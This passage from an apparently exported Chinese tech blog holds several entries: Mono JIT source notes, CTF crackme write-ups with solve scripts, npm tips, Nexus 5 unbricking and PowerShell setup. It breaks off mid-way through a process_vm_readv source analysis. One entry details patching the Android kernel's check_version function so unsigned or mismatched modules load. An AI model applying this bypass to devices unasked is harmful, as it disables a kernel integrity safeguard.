<h4 id="实现-1"><a href="#实现-1" class="headerlink" title="实现"></a>实现</h4><p><a href="https://github.com/mono/mono/blob/5d2e3bc3b3c8184d35b2f7801e88d96470d367c4/mono/metadata/object.c#L797">object.c#L797</a></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">gpointer</span></span><br><span class="line"><span class="function"><span class="title">mono_compile_method_checked</span> <span class="params">(MonoMethod *method, MonoError *error)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	gpointer res;</span><br><span class="line"></span><br><span class="line">	<span class="function">MONO_REQ_GC_NEUTRAL_MODE</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">	<span class="title">error_init</span> <span class="params">(error)</span></span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">g_assert</span> (callbacks.compile_method);</span><br><span class="line">	res = callbacks.<span class="built_in">compile_method</span> (method, error);</span><br><span class="line">	<span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="callbacks-compile-method"><a href="#callbacks-compile-method" class="headerlink" title="callbacks.compile_method"></a>callbacks.compile_method</h3><p><a href="https://github.com/mono/mono/blob/5d2e3bc3b3c8184d35b2f7801e88d96470d367c4/mono/mini/mini-runtime.c#L4445">mini-runtime.c#L4445</a></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> JIT_TRAMPOLINES_WORK</span></span><br><span class="line">	callbacks.compile_method = mono_jit_compile_method;</span><br></pre></td></tr></table></figure>

<h3 id="mono-jit-compile-method"><a href="#mono-jit-compile-method" class="headerlink" title="mono_jit_compile_method"></a>mono_jit_compile_method</h3><p><a href="https://github.com/mono/mono/blob/5d2e3bc3b3c8184d35b2f7801e88d96470d367c4/mono/mini/mini-runtime.c#L2755">mini-runtime.c#L2755</a></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">gpointer</span></span><br><span class="line"><span class="function"><span class="title">mono_jit_compile_method</span> <span class="params">(MonoMethod *method, MonoError *error)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	gpointer code;</span><br><span class="line"></span><br><span class="line">	code = <span class="built_in">mono_jit_compile_method_with_opt</span> (method, <span class="built_in">mono_get_optimizations_for_method</span> (method, default_opt), FALSE, error);</span><br><span class="line">	<span class="keyword">return</span> code;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>Unity</tag>
        <tag>Mono</tag>
        <tag>源码分析</tag>
      </tags>
  </entry>
  <entry>
    <title>解决WARNING linker unsupported flags DT_FLAGS_1</title>
    <url>/2021/08/24/ndk-warning-dt-flags/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>使用最新版本的NDK编译<code>victim</code>，执行时提示<code>WARNING: linker: unsupported flags DT_FLAGS_1=0x8000001</code>(不影响运行)。</p>
<h2 id="处理"><a href="#处理" class="headerlink" title="处理"></a>处理</h2><p>可使用<code>termux-elf-cleaner</code>替换<code>victim-patch-arm</code>的<code>DT_FLAGS_1</code>，从而去除<code>WARNING</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">elf-cleaner.exe victim-patch-arm</span><br></pre></td></tr></table></figure>
<p>（<code>ARM64</code>同理）</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/termux/termux-packages/issues/4894">WARNING: linker: unsupported flags DT_FLAGS_1=0x8000001</a></p>
]]></content>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>填数游戏&amp;Nonstandard Writeup</title>
    <url>/2018/12/02/isa-ctf3/</url>
    <content><![CDATA[<h2 id="填数游戏"><a href="#填数游戏" class="headerlink" title="填数游戏"></a>填数游戏</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>IDA打开，发现是C++代码。<br><img src="http://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/ida_2018-12-02_13-31-16.png"><br><code>check函数</code><br><img src="http://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/ida_2018-12-02_13-31-24.png"></p>
<span id="more"></span>
<p>看对象名字就是数独啊，初始化的内存大小为<code>324=4*9*9</code>，把<code>_data_start_</code>数据导出，脚本跑出数表，然后在线解一下。<a href="http://zh.sudoku.menu/info/solver.html">在线解数独</a><br><code>问题：005300000800000020070010500400005300010070006003200080060500009004000030000009700</code><br><code>答案：145327698839654127672918543496185372218473956753296481367542819984761235521839764</code><br>提交flag提示错误，所以没那么简单。<br>前面还有个<code>set_sudu</code>函数，点进去看看<br><img src="http://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/ida_2018-12-02_13-37-03.png"><br>要成功走到下一步就需要<code>set_sudu</code>返回0，也就是需要<code>set_number</code>返回1<br>点开<code>set_number</code><br><img src="http://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/ida_2018-12-02_13-43-08.png"><br>需要<code>*(_DWORD *)(a1 + 4 * (row + 9 * (_DWORD)this))</code>为0，才能返回1。而这个指针指向的就是题目对应位置的数字，所以flag对应位置的要为0</p>
<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printList</span>(<span class="params">li</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(li)):</span><br><span class="line">        <span class="built_in">print</span>(li[i],end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">quiz = <span class="built_in">list</span>(<span class="string">&quot;005300000800000020070010500400005300010070006003200080060500009004000030000009700&quot;</span>)</span><br><span class="line">printList(quiz)</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line">solve=<span class="built_in">list</span>(<span class="string">&quot;145327698839654127672918543496185372218473956753296481367542819984761235521839764&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">81</span>):</span><br><span class="line">    <span class="keyword">if</span>(solve[x]==quiz[x]):</span><br><span class="line">        solve[x] = <span class="string">&#x27;0&#x27;</span></span><br><span class="line">printList(solve)</span><br></pre></td></tr></table></figure>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/zhaijiahui/p/7876005.html">【逆向笔记】2017年全国大学生信息安全竞赛 Reverse 填数游戏</a></p>
<h2 id="Nonstandard"><a href="#Nonstandard" class="headerlink" title="Nonstandard"></a>Nonstandard</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p><img src="http://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/ida_2018-12-02_13-48-35.png"><br><img src="http://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/ida_2018-12-02_14-00-20.png"><br>输入的flag长度为28，加密后跟指定数据逐字比较，一致才能返回<br>根据<code>byte_402120</code>段的数据 <code>gQwjoQ66gQwioQ71jMQS2QBvggajnQy1gHpEjQHEjnrZ7===</code>推测是变形的base32算法，查看加密函数<code>sub_401070</code>发现确实是（照应标题）</p>
<p><img src="http://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/ida_2018-12-02_16-03-43.png"><br>点开加密函数<code>sub_401070</code>的初始化函数<code>sub_401000</code><br><img src="http://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/ida_2018-12-02_16-02-18.png"><br>我是直接执行后动态调试，下断点得到<code>pLoKiMjUnHyBgTvFrCdExSwZaQ765321</code></p>
<blockquote>
<ol>
<li>将偶数位变为小写字母</li>
<li>   再将字符串进行逆序</li>
<li>   后面加上765321<br><a href="https://blog.csdn.net/xiangshangbashaonian/article/details/81872485">i春秋2017第二届广东省强网杯线上赛Nonstandard题目writeup</a></li>
</ol>
</blockquote>
<h3 id="解密脚本"><a href="#解密脚本" class="headerlink" title="解密脚本"></a>解密脚本</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;gQwjoQ66gQwioQ71jMQS2QBvggajnQy1gHpEjQHEjnrZ7===&quot;</span></span><br><span class="line">table = <span class="string">&quot;pLoKiMjUnHyBgTvFrCdExSwZaQ765321&quot;</span></span><br><span class="line">tr = <span class="built_in">str</span>.maketrans(table,<span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ234567&quot;</span>)</span><br><span class="line">strEnBase32 = s.translate(tr)</span><br><span class="line"><span class="built_in">print</span>(strEnBase32)</span><br><span class="line"><span class="built_in">print</span>(base64.b32decode(strEnBase32))</span><br></pre></td></tr></table></figure>

<p>PS：有个字符串<code>ZmxhZ3tmbGFnX2lzX25vdF9tZSF9</code>没有引用，base64解出来是<code>flag&#123;flag_is_not_me!&#125;</code></p>
<h3 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h3><blockquote>
<p>base64编码是用64（2的6次方）个ASCII字符来表示256（2的8次方）个ASCII字符，也就是三位二进制数组经过编码后变为四位的ASCII字符显示，长度比原来增加1/3。<br>同样，base32就是用32（2的5次方）个特定ASCII码来表示256个ASCII码。所以，5个ASCII字符经过base32编码后会变为8个字符（公约数为40），长度增加3/5.不足8n用“=”补足。<br>base16就是用16（2的4次方）个特定ASCII码表示256个ASCII字符。1个ASCII字符经过base16编码后会变为2个字符，长度增加一倍。不足2n用“=”补足</p>
</blockquote>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>npm package.json scripts 传递参数</title>
    <url>/2021/11/21/npm-package-json-scripts-args/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>直接加参数运行（如：<code>npm run view test</code>），实际上是拼接字符串到末尾，不够灵活。</p>
<p>使用<code>npm_config</code>环境变量传递参数，支持多个参数、多条命令顺序执行。</p>
<h2 id="scripts"><a href="#scripts" class="headerlink" title="scripts"></a>scripts</h2><h3 id="方法一-使用npm-config环境变量（推荐）"><a href="#方法一-使用npm-config环境变量（推荐）" class="headerlink" title="方法一 使用npm_config环境变量（推荐）"></a>方法一 使用npm_config环境变量（推荐）</h3><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;scripts&quot;</span>: &#123;</span><br><span class="line"> <span class="attr">&quot;view&quot;</span>: <span class="string">&quot;echo %npm_config_host% &amp; echo %npm_config_port%&quot;</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行<code>npm run view --host=localhost --port=2333</code>即可</p>
<h4 id="跨平台环境变量"><a href="#跨平台环境变量" class="headerlink" title="跨平台环境变量"></a>跨平台环境变量</h4><p>如果脚本需要跨平台运行，可使用<code>cross-env</code>获取环境变量（就不需要区分<code>%npm_config%</code>和<code>$npm_config</code>了）</p>
<span id="more"></span>

<p>安装：<code>npm install cross-env --save-dev</code><br>使用：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;scripts&quot;</span>: &#123;</span><br><span class="line"> <span class="attr">&quot;view&quot;</span>: <span class="string">&quot;cross-env-shell echo %npm_config_host% &amp; echo $npm_config_port&quot;</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="方法二-调整命令格式"><a href="#方法二-调整命令格式" class="headerlink" title="方法二 调整命令格式"></a>方法二 调整命令格式</h3><p>仅适用于变量少、并且可以调整命令格式的情况。<br>原理：将参数调整至末尾<br>例如想要执行<code>frida -U appname -l _agent.js</code>，其中<code>appname</code>是可变的，则调整命令格式为：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;scripts&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;attach&quot;</span>: <span class="string">&quot;frida -l _agent.js -U&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此时执行<code>npm run attach appname</code>即可</p>
<h2 id="js或ts"><a href="#js或ts" class="headerlink" title="js或ts"></a>js或ts</h2><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;scripts&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;test&quot;</span>: <span class="string">&quot;node test.js&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>执行<code>npm run test appname</code>，直接从<code>process.argv</code>获取即可：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> args = process.argv.slice(<span class="number">2</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;process.argv：\n&#x27;</span>, process.argv)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;参数：\n&#x27;</span>, args)</span><br></pre></td></tr></table></figure>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/wuChiSha/article/details/107779382">npm script之传参</a><br><a href="https://blog.csdn.net/wuChiSha/article/details/107779382">npm scripts 使用指南</a></p>
]]></content>
      <tags>
        <tag>Node.js</tag>
      </tags>
  </entry>
  <entry>
    <title>绕过内核模块加载校验 (check_version)</title>
    <url>/2022/04/29/patch-kernel-check-version/</url>
    <content><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p><code>Redmi K40 Gaming</code>、<code>MIUI 12.5.8</code></p>
<h2 id="提取boot-img"><a href="#提取boot-img" class="headerlink" title="提取boot.img"></a>提取boot.img</h2><p>查看文件名：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -al /dev/block/by-name | grep boot</span><br></pre></td></tr></table></figure>
<p>提取<code>boot.img</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dd if=$(readlink /dev/block/by-name/boot_a) of=/sdcard/boot.img</span><br></pre></td></tr></table></figure>
<h2 id="提取内核"><a href="#提取内核" class="headerlink" title="提取内核"></a>提取内核</h2><h3 id="法1-PC"><a href="#法1-PC" class="headerlink" title="法1 PC"></a>法1 PC</h3><p>自己编译或者使用<a href="https://github.com/affggh/magiskbootkitchen">affggh/magiskbootkitchen</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb pull /sdcard/boot.img .</span><br><span class="line">./magiskboot unpack boot.img</span><br></pre></td></tr></table></figure>
<h3 id="法2-手机"><a href="#法2-手机" class="headerlink" title="法2 手机"></a>法2 手机</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./magiskboot unpack /sdcard/boot.img</span><br></pre></td></tr></table></figure>

<h2 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h2><p>使用<code>IDA64</code>打开<code>kernel</code>，选择<code>ARM processer</code>、<code>64-Bit</code>。<br>执行Python脚本：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">0x100000</span>):</span><br><span class="line">    idc.create_insn(i)</span><br></pre></td></tr></table></figure>
<p>然后等待<code>IDA</code>分析结束。</p>
<h2 id="定位check-version"><a href="#定位check-version" class="headerlink" title="定位check_version"></a>定位check_version</h2><p>使用<code>010Editor</code>搜索字符串<code>disagrees about version of symbol</code>，复制地址。<br>在<code>IDA64</code>中查看交叉引用，定位到的函数即为<code>check_version</code></p>
<h2 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h2><p>将函数体的第一个跳转Patch为B指令。然后F5，查看返回值是否为1。</p>
<p>例如：<br><code>CBZ X2, loc_FB8A8</code><br>Patch为：<br><code>B loc_FB8A8</code></p>
<p>相关代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ROM:00000000000FB8A8                               loc_FB8A8                               ; CODE XREF: sub_FB804+14↑j</span><br><span class="line">ROM:00000000000FB8A8 35 00 80 52                   MOV             W21, #1</span><br><span class="line">ROM:00000000000FB8AC 0A 00 00 14                   B               loc_FB8D4</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ROM:00000000000FB8D4                               loc_FB8D4                               ; CODE XREF: sub_FB804+74↑j</span><br><span class="line">ROM:00000000000FB8D4                                                                       ; sub_FB804+90↑j</span><br><span class="line">ROM:00000000000FB8D4                                                                       ; sub_FB804+A8↑j</span><br><span class="line">ROM:00000000000FB8D4 E0 03 15 2A                   MOV             W0, W21</span><br><span class="line">ROM:00000000000FB8D8 F4 4F 43 A9                   LDP             X20, X19, [SP,#0x20+var_s10]</span><br><span class="line">ROM:00000000000FB8DC F6 57 42 A9                   LDP             X22, X21, [SP,#0x20+var_s0]</span><br><span class="line">ROM:00000000000FB8E0 F7 0B 40 F9                   LDR             X23, [SP,#0x20+var_10]</span><br><span class="line">ROM:00000000000FB8E4 FD 7B C4 A8                   LDP             X29, X30, [SP+0x20+var_20],#0x40</span><br><span class="line">ROM:00000000000FB8E8 C0 03 5F D6                   RET</span><br></pre></td></tr></table></figure>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://bbs.pediy.com/thread-271179.htm">绕过Android内核模块加载验证</a></p>
]]></content>
      <tags>
        <tag>Android</tag>
        <tag>Kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>使用9008模式、LG FlashTool救砖（Nexus 5）</title>
    <url>/2021/09/07/nexus5-9008/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>之前买来调试用的<code>Nexus 5</code>坏了，雪花屏并且无限重启。记录一下刷机的过程。</p>
<p>PS：刷机后仍雪花屏，怀疑是硬件问题。</p>
<h2 id="禁用驱动程序强制签名"><a href="#禁用驱动程序强制签名" class="headerlink" title="禁用驱动程序强制签名"></a>禁用驱动程序强制签名</h2><p>安装完驱动后，需要禁用驱动程序强制签名（刷机完成后记得恢复）</p>
<h2 id="9008"><a href="#9008" class="headerlink" title="9008"></a>9008</h2><p><a href="https://forum.xda-developers.com/t/fix-unbrick-nexus-5-stucked-in-qualcomm-hs-usb-qdloader-9008-mode.3043301/">Unbrick Nexus 5 stucked in Qualcomm HS-USB QDLoader 9008 mode</a></p>
<h3 id="BoardDiag黑屏"><a href="#BoardDiag黑屏" class="headerlink" title="BoardDiag黑屏"></a>BoardDiag黑屏</h3><blockquote>
<p>Hold down SHIFT key and right click on a running program icon on the taskbar, a popup menu should appear, click on Move then use the Left/Right Arrow key to move it.<br>Do the same for the rest of the running programs.<br><a href="https://forum.xda-developers.com/t/boarddiag-v2-99a-by-willthecracker-opened-once-crashed-opens-but-only-in-taskbar.3407996/post-82425715">https://forum.xda-developers.com/t/boarddiag-v2-99a-by-willthecracker-opened-once-crashed-opens-but-only-in-taskbar.3407996/post-82425715</a><br>右键任务栏的<code>BoardDiag</code>图标，选择移动，然后按方向键移动窗口</p>
</blockquote>
<h2 id="LG-FlashTool"><a href="#LG-FlashTool" class="headerlink" title="LG FlashTool"></a>LG FlashTool</h2><p><a href="https://forum.xda-developers.com/t/tutorial-how-to-flash-factory-images-with-lg-flashtool.2713833/">[Tutorial] How to flash factory images with LG Flashtool</a></p>
]]></content>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>PowerShell配置主题、字体</title>
    <url>/2020/04/17/powershell-add-font/</url>
    <content><![CDATA[<h2 id="主题安装"><a href="#主题安装" class="headerlink" title="主题安装"></a>主题安装</h2><h3 id="安装模块"><a href="#安装模块" class="headerlink" title="安装模块"></a>安装模块</h3><p>win+x, PowerShell(管理员)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Install-Module posh-git -Force -SkipPublisherCheck</span><br><span class="line">Install-Module oh-my-posh -Force -SkipPublisherCheck</span><br></pre></td></tr></table></figure>
<h3 id="允许执行脚本"><a href="#允许执行脚本" class="headerlink" title="允许执行脚本"></a>允许执行脚本</h3><p>win+x, PowerShell(管理员)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set-ExecutionPolicy RemoteSigned</span><br></pre></td></tr></table></figure>
<h3 id="编辑配置文件"><a href="#编辑配置文件" class="headerlink" title="编辑配置文件"></a>编辑配置文件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (!(Test-Path -Path $PROFILE )) &#123; New-Item -Type File -Path $PROFILE -Force &#125;</span><br><span class="line">notepad $PROFILE</span><br></pre></td></tr></table></figure>
<p>写入以下内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chcp 65001</span><br><span class="line">Import-Module posh-git</span><br><span class="line">Import-Module oh-my-posh</span><br><span class="line">Set-PoshPrompt -Theme Paradox</span><br></pre></td></tr></table></figure>
<p>注意：旧版本<code>oh-my-posh</code>设置主题命令为<code>Set-Theme Paradox</code><br>全部主题见：<a href="https://github.com/JanDeDobbeleer/oh-my-posh/tree/master/Themes">JanDeDobbeleer/oh-my-posh/Themes</a></p>
<h2 id="字体安装及切换"><a href="#字体安装及切换" class="headerlink" title="字体安装及切换"></a>字体安装及切换</h2><h3 id="下载字体"><a href="#下载字体" class="headerlink" title="下载字体"></a>下载字体</h3><p>字体可以在这下载：<a href="https://github.com/powerline/fonts">powerline/fonts</a></p>
<h3 id="安装字体"><a href="#安装字体" class="headerlink" title="安装字体"></a>安装字体</h3><p>安装<code>for Powerline</code>结尾的字体，以<a href="https://github.com/powerline/fonts/raw/master/DejaVuSansMono/DejaVu%20Sans%20Mono%20for%20Powerline.ttf">DejaVu Sans Mono for Powerline.ttf</a>为例<br>右键字体文件，为所有用户安装</p>
<h3 id="应用字体"><a href="#应用字体" class="headerlink" title="应用字体"></a>应用字体</h3><p>重新打开PowerShell，右键标题栏，在<code>属性-字体</code>中修改字体<br>PS：如果没有已安装的字体，先执行<code>chcp 65001</code>再试</p>
<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>重新打开PowerShell，观察默认字体是否发生变化</p>
<h2 id="安装PSReadLine（可选）"><a href="#安装PSReadLine（可选）" class="headerlink" title="安装PSReadLine（可选）"></a>安装PSReadLine（可选）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Install-Module -Name PSReadLine -Force -SkipPublisherCheck</span><br></pre></td></tr></table></figure>
<p><code>notepad $PROFILE</code>，添加：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set-PSReadlineOption -EditMode Emacs</span><br></pre></td></tr></table></figure>
<p>双击Tab会出现智能提示：<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/powershell_readline.png"><br>参考：<a href="https://www.pstips.net/let-psreadline-light-ps-console.html">PSReadLine让PowerShell控制台高亮起来</a></p>
<h2 id="配置cmd默认活动代码页编号（可选）"><a href="#配置cmd默认活动代码页编号（可选）" class="headerlink" title="配置cmd默认活动代码页编号（可选）"></a>配置cmd默认活动代码页编号（可选）</h2><p>注意：配置后将导致无法执行bat脚本<br>win+r,<code>regedit</code><br>定位到<code>计算机\HKEY_CURRENT_USER\Console\%SystemRoot%_system32_cmd.exe</code><br>修改<code>CodePage</code>字段为65001(10进制)<br>之后启动cmd即可切换字体</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/weixin_30646315/article/details/95469049">Powershell 主题美化学习过程</a><br><a href="https://zhuanlan.zhihu.com/p/51901035">超酷的 PowerShell 美化指南</a><br><a href="https://blog.csdn.net/weixin_44490152/article/details/113854767">Windows Terminal + oh-my-posh模块美化官方教程集锦以及常见问题（问题收集中）</a></p>
]]></content>
      <tags>
        <tag>经验</tag>
      </tags>
  </entry>
  <entry>
    <title>process_vm_readv 源码分析</title>
    <url>/2022/05/02/process_vm_readv-analysis/</url>
    <content><![CDATA[<h2 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h2><p><code>process_vm_rw</code>-&gt;<code>process_vm_rw_core</code>-&gt;<code>process_vm_rw_single_vec</code>-&gt;<code>process_vm_rw_pages</code>-&gt;<code>copy_page_to_iter</code>-&gt;<br><code>copy_page_to_iter_iovec</code>-&gt;<code>copyout</code></p>
<h2 id="核心代码"><a href="#核心代码" class="headerlink" title="核心代码"></a>核心代码</h2><p><a href="https://cs.android.com/android/kernel/superproject/+/common-android-4.14-stable:common/mm/process_vm_access.c">common/mm/process_vm_access.c</a><br><a href="https://cs.android.com/android/kernel/superproject/+/common-android-4.14-stable:common/lib/iov_iter.c">common/lib/iov_iter.c</a></p>
<p>版本号：<code>android-4.14-stable</code></p>
<h2 id="Linux-manual-page"><a href="#Linux-manual-page" class="headerlink" title="Linux manual page"></a>Linux manual page</h2><p><a href="https://man7.org/linux/man-pages/man2/process_vm_readv.2.html">process_vm_readv(2) - Linux manual page</a></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/uio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">process_vm_readv</span><span class="params">(<span class="keyword">pid_t</span> pid,</span></span></span><br><span class="line"><span class="params"><span class="function">                        <span class="keyword">const</span> struct iovec *local_iov,</span></span></span><br><span class="line"><span class="params"><span class="function">                        <span class="keyword">unsigned</span> <span class="keyword">long</span> liovcnt,</span></span></span><br><span class="line"><span class="params"><span class="function">                        <span class="keyword">const</span> struct iovec *remote_iov,</span></span></span><br><span class="line"><span class="params"><span class="function">                        <span class="keyword">unsigned</span> <span class="keyword">long</span> riovcnt,</span></span></span><br><span class="line"><span class="params"><span class="function">                        <span class="keyword">unsigned</span> <span class="keyword">long</span> flags)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">process_vm_writev</span><span class="params">(<span class="keyword">pid_t</span> pid,</span></span></span><br><span class="line"><span class="params"><span class="function">                        <span class="keyword">const</span> struct iovec *local_iov,</span></span></span><br><span class="line"><span class="params"><span class="function">                        <span class="keyword">unsigned</span> <span class="keyword">long</span> liovcnt,</span></span></span><br><span class="line"><span class="params"><span class="function">                        <span class="keyword">const</span> struct iovec *remote_iov,</span></span></span><br><span class="line"><span class="params"><span class="function">                        <span class="keyword">unsigned</span> <span class="keyword">long</span> riovcnt,</span></span></span><br><span class="line"><span class="params"><span class="function">                        <span class="keyword">unsigned</span> <span class="keyword">long</span> flags)</span></span>;</span><br></pre></td></tr></table></figure>
<span id="more"></span>

<h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">SYSCALL_DEFINE6</span>(process_vm_readv, <span class="keyword">pid_t</span>, pid, <span class="keyword">const</span> struct iovec __user *, lvec,</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">long</span>, liovcnt, <span class="keyword">const</span> struct iovec __user *, rvec,</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">long</span>, riovcnt,	<span class="keyword">unsigned</span> <span class="keyword">long</span>, flags)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">process_vm_rw</span>(pid, lvec, liovcnt, rvec, riovcnt, flags, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">SYSCALL_DEFINE6</span>(process_vm_writev, <span class="keyword">pid_t</span>, pid,</span><br><span class="line">		<span class="keyword">const</span> struct iovec __user *, lvec,</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">long</span>, liovcnt, <span class="keyword">const</span> struct iovec __user *, rvec,</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">long</span>, riovcnt,	<span class="keyword">unsigned</span> <span class="keyword">long</span>, flags)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">process_vm_rw</span>(pid, lvec, liovcnt, rvec, riovcnt, flags, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="process-vm-access-c"><a href="#process-vm-access-c" class="headerlink" title="process_vm_access.c"></a>process_vm_access.c</h2><p><a href="https://cs.android.com/android/kernel/superproject/+/common-android-4.14-stable:common/mm/process_vm_access.c">common/mm/process_vm_access.c</a></p>
<h3 id="process-vm-rw"><a href="#process-vm-rw" class="headerlink" title="process_vm_rw"></a>process_vm_rw</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">process_vm_rw</span><span class="params">(<span class="keyword">pid_t</span> pid,</span></span></span><br><span class="line"><span class="params"><span class="function">			     <span class="keyword">const</span> struct iovec __user *lvec,</span></span></span><br><span class="line"><span class="params"><span class="function">			     <span class="keyword">unsigned</span> <span class="keyword">long</span> liovcnt,</span></span></span><br><span class="line"><span class="params"><span class="function">			     <span class="keyword">const</span> struct iovec __user *rvec,</span></span></span><br><span class="line"><span class="params"><span class="function">			     <span class="keyword">unsigned</span> <span class="keyword">long</span> riovcnt,</span></span></span><br><span class="line"><span class="params"><span class="function">			     <span class="keyword">unsigned</span> <span class="keyword">long</span> flags, <span class="keyword">int</span> vm_write)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iovstack_l</span>[<span class="title">UIO_FASTIOV</span>];</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span 